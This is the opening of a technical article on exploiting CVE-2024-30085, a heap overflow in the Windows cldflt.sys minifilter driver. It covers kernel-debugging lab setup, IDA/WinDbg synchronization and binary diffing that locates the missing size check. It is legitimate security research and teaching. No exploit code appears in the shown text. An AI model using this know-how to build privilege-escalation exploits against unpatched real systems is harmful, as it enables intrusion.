# https://exploitreversing.com/wp-content/uploads/2026/02/exploit_reversing_06.pdf

# Exploiting Reversing (ER) series \| Article 06

A Deep Dive Into Exploiting a Minifilter Driver (N-day)

(a step-by-step vulnerability research series on Win, macOS, hypervisors, browsers, and others)

by Alexandre Borges release date: 11/FEB/2026 \| rev: A.1

# 00\. Quote

“I made one decision in my life based on money. And I swore I would never do it again.” (Billy Beane played by Brad Pitt \| “Moneyball” movie - 2011)

# 01\. Introduction

Welcome to the sixth article of Exploiting Reversing (ER) series, a step-by-step vulnerability research series on Windows, macOS, hypervisors, browsers, and others, where we review concepts, architecture and practical steps related to vulnerability and exploitation research. My last articles are listed below:

▪ ERS\_05: [https://exploitreversing.com/2025/03/12/exploiting-reversing-er-series-article-05/](https://exploitreversing.com/2025/03/12/exploiting-reversing-er-series-article-05/) ERS\_04: [https://exploitreversing.com/2025/02/04/exploiting-reversing-er-series-article-04/](https://exploitreversing.com/2025/02/04/exploiting-reversing-er-series-article-04/) ERS\_03: [https://exploitreversing.com/2025/01/22/exploiting-reversing-er-series-article-03/](https://exploitreversing.com/2025/01/22/exploiting-reversing-er-series-article-03/) ▪ ERS\_02: [https://exploitreversing.com/2024/01/03/exploiting-reversing-er-series-article-02/](https://exploitreversing.com/2024/01/03/exploiting-reversing-er-series-article-02/) ERS\_01: [https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/](https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/) ▪ MAS\_10: [https://exploitreversing.com/2025/01/15/malware-analysis-series-mas-article-10/](https://exploitreversing.com/2025/01/15/malware-analysis-series-mas-article-10/) MAS\_09: [https://exploitreversing.com/2025/01/08/malware-analysis-series-mas-article-09/](https://exploitreversing.com/2025/01/08/malware-analysis-series-mas-article-09/) MAS\_08: [https://exploitreversing.com/2024/08/07/malware-analysis-series-mas-article-08/](https://exploitreversing.com/2024/08/07/malware-analysis-series-mas-article-08/) MAS\_07: [https://exploitreversing.com/2023/01/05/malware-analysis-series-mas-article-7/](https://exploitreversing.com/2023/01/05/malware-analysis-series-mas-article-7/) MAS\_06: [https://exploitreversing.com/2022/11/24/malware-analysis-series-mas-article-6/](https://exploitreversing.com/2022/11/24/malware-analysis-series-mas-article-6/) ▪ MAS\_05: [https://exploitreversing.com/2022/09/14/malware-analysis-series-mas-article-5/](https://exploitreversing.com/2022/09/14/malware-analysis-series-mas-article-5/) ▪ MAS\_04: [https://exploitreversing.com/2022/05/12/malware-analysis-series-mas-article-4/](https://exploitreversing.com/2022/05/12/malware-analysis-series-mas-article-4/) ▪ MAS\_03: [https://exploitreversing.com/2022/05/05/malware-analysis-series-mas-article-3/](https://exploitreversing.com/2022/05/05/malware-analysis-series-mas-article-3/) MAS\_02: [https://exploitreversing.com/2022/02/03/malware-analysis-series-mas-article-2/](https://exploitreversing.com/2022/02/03/malware-analysis-series-mas-article-2/) MAS\_01: [https://exploitreversing.com/2021/12/03/malware-analysis-series-mas-article-1/](https://exploitreversing.com/2021/12/03/malware-analysis-series-mas-article-1/)

This article is the third installment of a sequence of kernel driver’s articles (check ERS\_01 and ERS\_02), and this time we will adopt a practical approach for exploiting a real minifilter driver. The real purpose of this article is to cover the exploitation of a N-day in details, and reveal a sequence of concepts, techniques, and interpretations through phases such as reverse engineering, static and dynamic analysis, multiple proof-ofconcept constructions and finally develop and build all stages of an exploit for a real-world mini-filter driver and reach the elevation of privilege to SYSTEM.

# 02\. Acknowledgments

It's 2026, and even today, there are very few detailed documents on vulnerability research and real-world exploit development Currently, I have the distinct impression that the era of information sharing is over. In fact, nowadays, we have several new articles per week, but most of them only aim to show the final results, without explaining the entire process from beginning to end, which doesn't help other colleagues to give their own steps in exploitation research. Unfortunately, the willingness to demonstrate the craft of exploit development has diminished due to money and other factors.

A few years ago, when I started authoring articles on malware analysis, vulnerability research, and exploitation, I had a clear decision in mind: I should share information without restrictions because, in the end, this wouldn't prevent me from improving my skills and pursuing my career. As expected, time is a major limitation for writing regularly, but I continue to strive to establish a solid foundation of information that can be valuable to other professionals. As I always remember, I wouldn't have been able to author these articles without the help of Ilfak Guilfanov ( $@$ ilfak) and Hex-Rays SA (@HexRaysSA), who have offered me all the necessary support over the years. Finally, research is living in a new era of AI, but nothing replaces our minds, capable of generating unlimited knowledge and solving problems that, at first glance, seem impossible.

Life may be short, but every moment is worthwhile because people are the best thing in this world. Enjoy the journey and keep exploiting it!

# 03\. Lab infrastructure

This article demands the following environment:

A physical and/or a virtual machine running Windows 11 23H2, Windows 11 22H2 and Windows 1 22H2. IDA Pro or IDA Home version ( $@$ HexRaysSA): [https://hex-rays.com/ida-pro/](https://hex-rays.com/ida-pro/) . Readers might use Binary Ninja, Ghidra and other ones, but I will be using IDA Pro and its decompiler in this article. To analyze binary patches, we will use BinDiff, but I recommend you also use Diaphora to get a complete perspective of the binary. o BinDiff: [https://github.com/google/bindiff/releases/tag/v8](https://github.com/google/bindiff/releases/tag/v8) o Diaphora: [https://github.com/joxeankoret/diaphora](https://github.com/joxeankoret/diaphora)

▪ Install Windows SDK $^ +$ Visual Studio $^ +$ Windows Development Kit (optionally):

Visual Studio: [https://visualstudio.microsoft.com/downloads/](https://visualstudio.microsoft.com/downloads/). During the installation, don’t forget to install “Desktop development with ${ \\mathsf { C } } { + } { + } ^ { \\prime \\prime }$ set.

Windows SDK: [https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/) Windows Development Kit (WDK): [https://learn.microsoft.com/en-us/windows](https://learn.microsoft.com/en-us/windows)

hardware/drivers/download-the-wdk

# 04\. Lab configuration

One of the first steps for analyzing kernel drivers is to set up a functional debugging environment and even though it is not a challenging task, there are many intricate details that might be important and, eventually, responsible for getting a working environment. Such an environment is crucial to getting the correct understanding about areas of the code that are complicated to follow only by analyzing a static code.

# 4.1 Kernel Debugging

To the next steps I assume that you have either one physical system (host) communicating with a virtual machine (target) or two virtual machines, one of which is the host, and the other one is the target. In my specific case, I have adopted the first scenario (a physical host debugging virtual machines). My host runs Windows 11 Pro edition and as mentioned, I will be using multiple builds of Windows 11 and Windows 10 running on virtual machines. Furthermore, I am using VMware Workstation Pro (from Broadcom).

Windows kernel and drivers can be debugged through a network connection, USB and serial connection and as expected, the network approach is the preferred way, but serial communication can be useful and used in certain contexts. As reference, the IP addresses involved are:

host: 192.168.0.96 virtual machine (Ethernet\_01): DHCP (NAT)

Once again, it is quite important to highlight the following points:

▪ Use an NAT type interface and not Bridge type to avoid any communication issue.

▪ Use DHCP address and not fixed address.

You should try to ping from host (debugger) to virtual machine (target), and vice-versa, to guarantee that everything is working well. Additionally, two further details can be relevant on both systems:

Check whether the Windows Firewall is blocking the connection.

Optionally, go to Settings $>$ Network & Internet $>$ Advanced network settings $>$ Advanced sharing settings, and enable Network Discovery.

There are multiple ways to setup kernel debugging through network. Probably using KDNET is the easiest and most recommended way, and can be performed by executing the following steps:

# On the target

mkdir C:\\kdnet

copy "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\kdnet.exe" C:\\kdnet

copy "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\VerifiedNICList.xml"

C:\\kdnet

cd C:\\kdnet

kdnet (check supported network interfaces)

bcdedit /set key 1.2.3.4

kdnet 192.168.0.96 50008 -k

One of great advantages of kdnet is that it adjusts the debugging settings with busparams automatically. Another particularly useful feature from KDNET is that it offers options to debug the kernel (k), hypervisor, boot manager and winload, as shown below:

▪ b - enables bootmgr debugging ▪ h - enables hypervisor debugging ▪ k - enables kernel debugging w - enables winload debugging

Thus, we can enable more than one option at the same time, like -kh that enabled kernel and hypervisor debugging at the same time. One disadvantage is that it does not allow to set the key directly to authorize the communication, and if you have never executed other bcdedit command, it is likely that kdnet will return to the terminal a long key, which is not necessary for our tests, and that is the reason why I have used bcdedit command to set it explicitly.

Another way to configure is by directly using only bcdedit, which reaches the same results and requires almost identical settings. You will need to retrieve the system network hardware information, and this task can be done through multiple ways:

▪ PowerShell: Get-NetAdapterHarwareInfo ▪ Executing kdnet.exe Checking Device Manager

Using PowerShell, the network hardware information can be viewed below:

# PS C:\\Users\\Administrator>Get-NetAdapterHardwareInfo

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/091f7ba82a80510b2aab85682744d3296fbf6e47ee338cbcf7a1a4ed2465e9b0.jpg)

\[Figure 01\]: PowerShell: getting network adapter information

To setup kernel debugging using bcdedit, run the following steps:

bcdedit /debug on

bcdedit /dbgsettings net hostip:192.168.0.96 port:50008 busparams:3.0.0 key:1.2.3.4

bcdedit /dbgsettings (check the changes)

Indeed, it is an almost identical to the previous procedure, but it does not offer “ready-to-use” options to setup kernel, winload or bootmgr debugging, and if we needed to do this, we would have to do it manually. On both systems (host and target), I strongly recommend you configure the following system environment variable:

\_NT\_SYMBOL\_PATH $=$ srv\*c:\\symbols\* [https://msdl.microsoft.com/download/symbols](https://msdl.microsoft.com/download/symbols)

To create this system environment variable by setting it at Advanced Windows Setting $>$ Environment Variables and creating the \_NT\_SYMBOL\_PATH as explained above.

# On the host:

windbg -k net:port $=$ 50008,key=1.2.3.4

Finally, reboot the target (virtual machine): shutdown -r -t 0

If everything went well, readers should see an output similar to the following one and, if the debugger does not stop, you can pick up to Debug $>$ Break :

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/304deb570a1aabeaf58e0115ea5c64267b02f62e414612db8c496b53fc45e283.jpg)

\[Figure 02\]: Kernel debugging session

To resume the virtual machine execution and exit from WinDbg, type qd. Probably WinDbg will exit, and you will have to log on to the virtual machine again, but everything should be working well.

If you receive an error by executing the command above, try to change the used port (in this case 5364) because there could be something already running on this specific port. If there is any communication between the host and the target, check firewall rules and, in special, search for “Windows GUI Symbolic Debugger” and/or “Windows Kernel Debugger” in Inbound Rules. If it is blocked, allow it. Personally, I prefer to use the latest version of WinDbg (previously named “WinDbg Preview”), which can be retrieved from [https://aka.ms/windbg/download](https://aka.ms/windbg/download) or easily by executing winget install Microsoft.WinDbg

Once you open WinDbg, go to File \| Attach to Kernel \| Net tab and type the port (50008), key (1.2.3.4) and, optionally, the target IP address (192.168.0.96 in my case):

# Start debugging

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/4bba68de87b2eeaaa25c122bcbbae1012401fc79be2404a769a3981210e340a3.jpg)

\[Figure 03\]: WinDbg setup

Probably Windows Firewall will pop up a message asking authorization to connect and, as readers already know, the recent version of WinDbg is better than the previous one:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/a3551a56e881749f0d4420bb8efd858a185c214f9cd5d03279b154fc245e61ce.jpg)

\[Figure 04\]: WinDbg: remote kernel debugging

At the same way, we can detach (there is a Detach button), resume the target virtual machine execution by executing g (go) and even stop the WinDbg debugging session (there are Stop Debugging button).

In this new WinDbg version, target’s configurations are stored in C:\\Users\\Administrator\\AppData\\Local\\DBG\\Targets folder.

# 4.2 Code Synchronization

There are multiple methods that can be used while investigating a code for vulnerabilities, mainly if you are searching for Windows vulnerabilities and, eventually, if you are also analyzing kernel drivers.

One of most interesting IDA Pro plugins is Ret-Sync, which is used for synchronizing IDA Pro, Binary Ninja, and Ghidra with WinDbg or any other ring-3 debugger. In my case, I will be setting ret-sync $^ +$ IDA Pro $^ +$ WinDbg.

To set up ret-sync, execute the following steps:

1. git clone [https://github.com/bootleg/ret-sync](https://github.com/bootleg/ret-sync)
2. cd ret-sync\\ext\_ida
3. Copy the following files and folders:

▪ copy SyncPlugin.py "%APPDATA%\\Hex-Rays\\IDA Pro\\plugins" md "%APPDATA%\\Hex-Rays\\IDA Pro\\plugins\\plugins\\retsync" copy retsync\\\*.py "%APPDATA%\\Hex-Rays\\IDA Pro\\plugins\\retsync"

4. Open the ret-sync folder and go to ext\_windbg\\sync. There will be a Visual Studio Solution named sync.sln.

cd ret-sync\\ext\_windbg\\sync open sync.sln up on Visual Studio and build up the project using Release configuration. The compiling result will be the sync.dll file.

5. Copy the sync.dll (64-bit) file to the appropriate folder:

cd Release

(WinDbg extension directory) copy sync.dll "C:\\Program Files (x86)\\Windows

Kits\\10\\Debuggers\\x64\\winext"

(WinDbg Preview) copy sync.dll C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg\_8wekyb3 d8bbwe ” (take care: likely the WinDbg’s name here is different from yours).

If readers want to evaluate the plugin against a 32-bit then you should choose x86 configuration on Visual Studio and copy the resulting sync.dll to appropriate folder.

6. Create a project folder for your research: C:\\Users\\Administrator\\Desktop\\EXPLOITING\_REVERSING\\RESEARCH\\WINDOWS\_11 (example). A good approach is to create multiple folders, one to each virtual machine, and keep separate folders to distinguished virtual machines because you will need to copy system files to the respective folder later.

7. Inside the chosen project folder, create a .sync file containing the following (of course, you must adapt the configuration to your host’s IP address):


\[INTERFACE\]

host $=$ 192.168.0.96

port $=$ 9234

\[ALIASES\]

ntoskrnl.exe $=$ ntkrnlmp.exe

8. Copy this file (.sync file) to the home directory of the system where the WinDbg is executed (C:\\Users\\Administrator folder, for example). As a valuable note, both IDA Pro and WinDbg could be on the same system if you want.

9. To confirm that the setup is working, copy the following files from the target machine (target) to your project folder:


ntoskrnl.exe kernelbase.dll ntdll.dll kernel32.dll (optional)

There are multiple ways to accomplish this task. Personally, I use scp command as shown below:

▪ cd C:\\Windows\\System32 scp ntoskrnl.exe kernelbase.dll ntdll.dll [Administrator@192.168.0.96](mailto:Administrator@192.168.0.96):C:\\Users\\Administrator\\Desktop\\EXPLOITING\_REVERSING\\R ESEARCH\\WINDOWS\_11\

10. Open the ntoskrnl.exe on IDA Pro and, afterwards, load the remaining files (kernelbase.dll and ntdll.dll) inside the same database. To perform this task go to File $>$ Load file $>$ Additional binary file. Accept all default values for loading binaries and as expected it will take some time to finish.

11. Once the IDA Pro is loaded, go to Edit $>$ Plugins $>$ ret-sync (Alt-Shift-S):


a. mark synchronization enabled b. mark Hex-Rays Synchronization enabled

Once again, Windows Firewall can cause problems whether the IDA Pro and WinDbg are installed on different systems. To check for any existing problem, you can take the following steps:

▪ Enable Network Discovery (network advanced settings). Execute: netsh advfirewall firewall set rule group $\| =$ "Network Discovery" new enable $\\vDash$ Yes Execute the wf.msc and search for “File and Printer Sharing (Echo Request - ICMPv4-In)” in Inbound Rules and allow this rule (by right-clicking on it).

Enable ret-sync on IDA Pro: Edit $>$ Plugins $>$ ret-sync (ALT+SHIFT+S).

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/11220e10e551481a5e78a7a6cc3c10fe8ecda48afc64e773984d611bc200f8dd.jpg)

\[Figure 05\]: ret-sync configuration

Establish a debug session using WinDbg and use the configured ret-sync plugin:

windbg -k net:port=50008,key $^ { - 1 }$ .2.3.4

.load sync

!sync

u rip

# Readers should see the following:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/8e52143b31bfec716ce4b77576be8eaa2747e0e4bf868c062c12a1a80b6beb95.jpg)

\[Figure 06\]: WinDbg: ret-sync and debugger commands

At the same time, you should see the disassembly and respective pseudo on IDA Pro:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/da46d42a716ce522861e7d3acb1ab1573452612a12bef1992b2dcac335792427.jpg)

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/13e97ff2ac85da10ee5dab9645075b6a109ea80522e3b5cae061909508941f74.jpg)

\[Figure 07\]: IDA Pro: disassemble and pseudo code

The configuration was successful since the code and addresses are consistent! Although picture shows only the routine responsible for the breakpoint in this example, the power provided by having WinDbg synchronized with IDA Pro is really helpful.

Try something more exciting like putting a breakpoint on ReadFile function:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/9965e4f23d0bc25e29a39457e3e481326ae5bdf06aade5dec6aae27d645fd801.jpg)

\[Figure 08\]: WinDbg: sequence of setting a breakpoint, checking it, and running the target system

\[Figure 09\]: IDA Pro Output window

If something went wrong, try to check whether you see the following messages on IDA’s Output window as shown below:

\[sync\] default idb name: ntoskrnl.exe

EXPLOITING\_REVERSING\\RESEARCH\\WINDOWS\_11\\WINDOWS\_RESEARCH\_B\\.SynC')

\[sync\] overwrite idb name with ntkrnlmp.exe

\[sync\]sync enabled

riPyto0\\pythonsAdmiitratAppRomigHex-D

Pro\\plugins\\retsync\\broker.py" --idb "ntkrnlmp.exe"

\[sync\] module base 0x140000000

\[sync\] hexrays #8.4.0.240320 found

\[sync\] broker started

\[sync\] plugin loaded

sync\] $< <$ broker $< <$ dispatcher not found, trying to run it

\[sync $< <$ broker $< <$ dispatcher now runs with pid: 2712\
\
\[sync $< <$ broker << connected to dispatcher\
\
sync\] $< <$ broker << dispatcher msg: add new client (listening on port 55436), nb client(s): 1\
\
sync\]hexrays sync enabled

On IDA View and Decompile View, it is possible to immediately see the following output, which proves that there is a correct synchronization and NtReadFile function, as expected:

# IDA View-A

|     |     |     |
| --- | --- | --- |
| PAGE:00000001407E0B30 Length = dword ptr 38h |
| PAGE:00000001407E0B30 ByteOffset = qword ptr 40h |
| PAGE:00000001407E0B30 Key = qword ptr 48h PAGE:00000001407E0B30 |
| PAGE:00000001407E0B30 FUNCTION CHUNK AT PAGE:000000014089F1EA SIZE 0000002F BYTES PAGE:00000001407E0B30 |
|  |
| PAGE:00000001407E0B30 | mov mov | r11, rsp \[r11+8\], rbx |
| PAGE:00000001407E0B33 • PAGE:00000001407E0B37 | mov | \[r11+10h\], rbp |
| C PAGE:00000001407E0B3B |  |  |
| PAGE:00000001407E0B3F | mov | \[r11+18h\], rsi |
| . | mov | \[r11+20h\], rdi |
| PAGE:00000001407E0B43 | push | r14 |
| PAGE:00000001407E0B45 | sub | rsp, 80h |
| PAGE:00000001407E0B4C • | mov | rax, gs:188h |
| PAGE:00000001407E0B55 • | xor | r14d, r14d |
| PAGE:00000001407E0B58 • | mov | rdi, r9 |
| PAGE:00000001407E0B5B • | mov | \[r11-60h\], r14 |
| PAGE:00000001407E0B5F • | mov | rsi, r8 |
| PAGF:00000001407F0R62 | mov | \[r11-18h\] r14 |
|  | 0074DB30 00000001407E0B30: NtReadFile (Synchronized with Hex View-l, Pseudocode-A) |  |

# Pseudocode-A

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/d31a0f224e7c5d0a5fd8cf7ccb819a6409d6f851acd481677524b1232a5fcb87.jpg)

\[Figure 10\]: IDA Pro: disassembler and decompiler synchronized with WinDbg

From this point, you can use step-in (t) and step-over (p) commands on WinDbg, and all executions will be automatically mirrored to IDA Pro. To clear the breakpoint and the synchronization on WinDbg, execute:

bc 0 !syncoff

If you are using the new WinDbg version and want to keep the target system running, then just execute $\\mathbf { \\bar { g } ^ { \\prime \\prime } }$ and close or stopping the WinDbg session.

A similar procedure also exists to other disassembler products, and readers can check the Ret-Sync website for further details.

It is time to move forward to our target for gathering first information and associated context.

# 05\. Gathering information \| Win 11 23H2 and 22H2

One of most interesting mini-filter vulnerabilities to learn in kernel exploitation is the CVE-2024-30085 (Windows Cloud Files Mini Filter Driver Elevation of Privilege Vulnerability), which is described by the following links:

▪ [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30085](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30085)

▪ [https://www.cve.org/CVERecord?id=CVE-2024-30085](https://www.cve.org/CVERecord?id=CVE-2024-30085)

The information offered by links above is as follows:

The official description of the vulnerability is “Windows Cloud Files Mini Filter Driver Elevation of Privilege Vulnerability”. The notification has been released in Jun/11/2024. The associated vulnerability class is Heap Buffer Overflow ( [https://cwe.mitre.org/data/definitions/122.html](https://cwe.mitre.org/data/definitions/122.html)).

▪ The attack vector is a local (and not remote) vulnerability. The impacted Windows versions are Windows 11 23H2, 22H2 and 21H2, and Windows 10 21H2 and 22H2 as also their respective previous versions, and as expected, the vulnerability also is valid for different platforms and architectures.

▪ For the Windows 11 versions mentioned, the associated fix is given by KB5039212: o [https://support.microsoft.com/en-us/topic/june-11-2024-kb5039212-os-builds-22621-](https://support.microsoft.com/en-us/topic/june-11-2024-kb5039212-os-builds-22621-) 3737-and-22631-3737-d7f574c0-2b13-48ca-a9fc-a63093b1a2c2. o The direct link to the Microsoft Catalog is [https://www.catalog.update.microsoft.com/Search.aspx?q=KB5039212](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5039212).

The first step is to understand the role of cldflt.sys, which is responsible for managing and handling cloud operations (file access, performance optimization, synchronization) like OneDrive, but not only, and that caused crashes in the past. Although we are going dive into details later, as any cloud operation on Windows, the main propose of this mini-filter driver is to make daily cloud tasks transparent for users.

# 06\. Binary diffing \| Win 11 22H2

The next step is to get the vulnerable and also updated versions of the mini-filter driver to understand applied fixes and the real nature of the vulnerability. We need a virtual environment to perform our tests, and I am going to use Windows 11 22H2 and 23H2, which are quite similar om the context of this vulnerability. In next sections, I am going to repeat the same approach with Windows 10 22H2, including reversing a few routines. From a certain point, I will continue the analysis focused on Windows 10 22H2, including the exploitation phases. Anyway, exploit works for Windows 11 23H2, Windows 11 22H2 and Windows 10 22H2. As a strong recommendation, readers should disable any Windows update actions to avoid facing an altered environment, although it is not always a simple task.

Winbindex ( [https://winbindex.m417z.com/?file=cldflt.sys](https://winbindex.m417z.com/?file=cldflt.sys)) shows the updates for this driver (on page 2):

# cldflt.sys - Winbindex

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/e7832ad249662ec7bf8a89af71d8fed5750aad413f20e7a99264ea647ca50749.jpg)

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/7457168448ca35e80fdcc7fe2249f7c19c5b3686796b15065094bd553ccddade.jpg)

\[Figure 11\]: Winbindex: cldflt.sys driver \| Windows 11 22H2

You can download previous versions of the same minifilter driver as shown above, and I have downloaded versions of 11/JUN and MAY/29/2024. By the way, there is a notation $( + 1 )$ on the right side of the Windows build, and it tells that the patch is applied to Windows 11 22H2 and 23H2.

I opened the fixed cldflt.sys of JUN/11/2024 (KB5039212) and one of its previous versions (MAY/29/2024 – KB5037853) in the IDA Pro, decompiled both files and performed binary diffing using BinDiff ( [https://zynamics.com/software.html](https://zynamics.com/software.html)) as shown below:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/2409d8dc1338e93ad174101e9b995dcc559f94983aa5fa188b3064a4f2667944.jpg)

\[Figure 12\]: BinDiff \| Windows 11 22H2

If you do not know how to perform the binary diffing, check the second article of this series (ERS\_02: [https://exploitreversing.com/2024/01/03/exploiting-reversing-er-series-article-02/](https://exploitreversing.com/2024/01/03/exploiting-reversing-er-series-article-02/)). We see that the four functions have present a similarity below $100 %$ . In the image, Primary is the fixed mini-filter driver (cldflt\_JUN\_11\_2024.sys) and Secondary is the vulnerable driver (cldflt\_MAY\_29\_2024.sys). The HsmIBitmapNORMALPrepareCommit, HsmIBitmapNORMALOpen, HsmpCtxCreateStreamContext have been changed, and Feature\_1869521215\_\_private\_IsEnabledFallback has been introduced. Actually, it is exactly at this point (this new functionality) that the vulnerability has been fixed:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/46efb524b6c50d33ff8d67ca6f60cfb4ac95ddb126e24cb997e3725fd564ce91.jpg)

\[Figure 13\]: BinDiff: spotting changes \| Windows 11 22H2

In terms of code, BinDiff points to the following piece of code (in special, at 0x1C007753B), but the issue (and consequence) is not exactly here:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/029e2c82d9c1c92489c46b6d915a9695ea24f57e5bec1068c4f855c08d1601fe.jpg)

\[Figure 14\]: Spotting the initial critical point on IDA Pro

In particular, the initial relevant instruction is cmp r14d, 1000h, which is clearly associated with a certain limit (in the vulnerable code there is not this verification) that present grave consequences to the following lines. Of course, the code representation above is far from be not good and it is possible to improve it a bit, but it will be done in details in later sections.

It is recommended to understand the sequence of called functions and routines up to this point, which is the HsmIBitmapNORMALOpen function, because it will help us to determine possible variable types and also make the code easier to interpret as also its context.

[https://exploitreversing.com](https://exploitreversing.com/)

If you use IDA Proximity Browser to trace potential paths up to HsmIBitmapNORMALOpen function, and a good recommendation is always to change the path’s color, as shown below:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/f3fe751e9d5a38a273578b868b16573d5025f4007800e027389285aafab57473.jpg)

\[Figure 15\]: Potential paths up to HsmIBitmapNORMALOpen function

The graph below shows involved functions, which will be useful for getting further comprehension of the vulnerability pointed to by Microsoft. Another possible and cleaner view is shown below:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/39abb0b040c7874b6f4941e387e677339de9d8aac8553ac1ca9af54e204280f9.jpg)

\[Figure 16\]: A clean view of HsmIBitmapNORMALOpen’s parent functions

Readers can argument that is almost the same output, but it is fact the simplified code is helpful to quickly trace possible sequence of function calls. Requesting path details to IDA Pro, the following calling functions are returned:

[https://exploitreversing.com](https://exploitreversing.com/)

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/8add0dfedd570e12e02742fe4dacc8145a47c0c416f851e68bd8623879fd7e37.jpg)

\[Figure 17\]: Called functions up to the HsmIBitmapNORMALOpen function

The first functions provide a good indication of the concepts involved. We already know that the vulnerability resides in HsmIBitmapNORMALOpen function, even though I have not shown it yet, and prior to this routine there are other routines that are executed, and some of them are HsmFltPostQUERY\_OPEN (or HsmFltPostNETWORK\_QUERY\_OPEN), HsmiFltPostECPCREATE, HsmpSetupContexts and HsmpCtxCreateStreamContext.

At this point we have a simplified draft on the involved functions and the sequence of called ones up to the critical and vulnerable routine. However, the mini-filter driver itself starts much before this point and, to learn it in depth, it is be recommended to check the start point and, if necessary, get a superficial understanding before analyzing the entire path until the HsmIBitmapNORMALOpen function, at least.

# 07\. Gathering Information and binary diffing (Win 10 22H2)

In terms of Windows 10 22H2, information is pretty similar to Windows 11 23H2 and 22H2, the fix is provided by KB5039211:

[https://support.microsoft.com/en-us/topic/june-11-2024-kb5039211-os-builds-19044-4529-and19045-4529-f7e528c9-5e9f-4cd8-9161-704708448517](https://support.microsoft.com/en-us/topic/june-11-2024-kb5039211-os-builds-19044-4529-and19045-4529-f7e528c9-5e9f-4cd8-9161-704708448517) The direct link to the Microsoft Catalog is [https://www.catalog.update.microsoft.com/Search.aspx?q=KB5039211](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5039211).

I have downloaded versions of 11/JUN/2024 (KB5039211) and MAY/29/2024 (KB5037849). At the same way, there is a notation $( + 1 )$ on the right side of the Windows build, and it tells exactly that the patch is applied to Windows 10 22H2 and Windows 10 21H2.

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/cb82efe86ea45263e890f3cf0490461eb137672e923c0add59adce7b7b92fc8c.jpg)

\[Figure 18\]: Winbindex: cldflt.sys driver (Windows 10 \| 22H2 \| JUN/24)

\[Figure 19\]: Winbindex: cldflt.sys driver (Windows 10 \| 22H2 \| JUN/24)

|     |     |     |     |     |     |     |     |
| --- | --- | --- | --- | --- | --- | --- | --- |
| SHA256 | Window... ↑↓ | 2024-.. 1 l | x64 ↑ l | File version I l | File size ↑ ↓ | Extra | Download |
| 1b69dc... | .Windows.10.21H2.(±.1) | KB5039211 | x64 | 10.0.19041.4522 | 491.5 KB | Show | Download |
| SHA256 | Windows | Update | File arch | File version | File size | Extra | Download |

Open the fixed cldflt.sys of JUN/11/24 (KB5039211) and one of its previous versions (MAY/29/2024 – KB5037849) in the IDA Pro, decompile both files and perform binary diffing using BinDiff ( [https://zynamics.com/software.html](https://zynamics.com/software.html)) as shown below:

|     |     |     |     |     |     |     |     |     |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
|  | Similarity Confic EA Primary |  | Name Primary | EA Secondary | Name Secondary |  | Matched Basic Blox Basic Blo |  |
| 0.99 | 0.99 | 00000001C004D… | HsmIBitmapNORMALPrepareCommit | 00000001C004D… | HsmIBitmapNORMALPrepareCommit | 280 | 280 | 280 |
| 0.98 | 0.99 |  | 00000001C005BF.… HsmIBitmapNORMALOpen | 00000001C005BF…. | HsmIBitmapNORMALOpen | 126 | 132 | 126 |
| 0.90 | 0.99 |  | 00000001C00697... HsmpCtxCreateStreamContext |  | 00000001C00697... HsmpCtxCreateStreamContext | 254 | 266 | 264 |
| 1.00 | 0.99 | 00000001C00010... | \_tgKeywordOn | 00000001C00010... | \_tlgKeywordOn | 5 | 5 | $50 |
| 1.00 | 0.99 | 00000001C00010.….\_tlgCreate1Sz\_char |  | 00000001C00010.….\_tgCreate1Sz\_char |  | 6 | 6 |  |
| 1.00 | 0.99 |  | 00000001C00010..\_tlgWriteTransfer\_EtwWriteTransfer |  | 00000001C00010...\_tlgWriteTransfer\_EtwWriteTransfer | 1 | 1 | 1 |

Similar to the analysis we did for Windows 11 22H2, there are three functions that present a similarity below $100 %$ . In the image, Primary is the fixed mini-filter driver (cldflt\_JUN\_11\_2024.sys) and Secondary is the vulnerable driver (cldflt\_MAY\_29\_2024.sys). The HsmIBitmapNORMALPrepareCommit, HsmIBitmapNORMALOpen and HsmpCtxCreateStreamContext have been changed.

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/81c7fb8acc374e728144f9ca1826073af89cfe63c671ef8baa977bc615e13141.jpg)

\[Figure 20\]: BinDiff \| Windows 10 22H2

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/3871960caa238f78683de3abc749088bb0d94ecd8c7b263d1163ec13b2993f52.jpg)

\[Figure 21\]: BinDiff – spotting changes \| Windows 10 22H2

In terms of code, the BinDiff points to the following piece of code, in special address starting from 0x1C005C3BC to 0x1C005C3CC, and the same fix from Windows 11 is applied (cmp r14d, 1000h) and the path from HsmFltPostQUERY\_OPEN to HsmIBitmapNORMALOpen is also the same:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/d8a7973ee98c22fa16022d760792e67ed8b5cd81e0b32365b01b69e80e6ff401.jpg)

\[Figure 22\]: Highlighting the applied fix \| Windows 10 22H2

